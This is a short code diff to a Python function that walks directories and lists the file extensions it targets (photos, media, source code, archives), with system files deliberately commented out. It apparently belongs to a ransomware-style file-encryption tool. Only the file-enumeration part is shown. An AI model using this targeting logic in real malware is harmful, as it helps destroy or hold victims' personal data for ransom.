@@ -24,7 +24,7 @@ def discoverFiles(startpath):
     # This will not cover all files, but it should be a decent range.
     extensions = [
         # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
-        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', 'JPG', 'JPEG', 'NEF' # images
+        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', 'JPG', 'JPEG', 'NEF', # images
         'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
         'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
 
@@ -41,6 +41,7 @@ def discoverFiles(startpath):
         'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
 
         'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
+        'crypt',
     ]
     for dirpath, dirs, files in os.walk(startpath):
         for i in files:
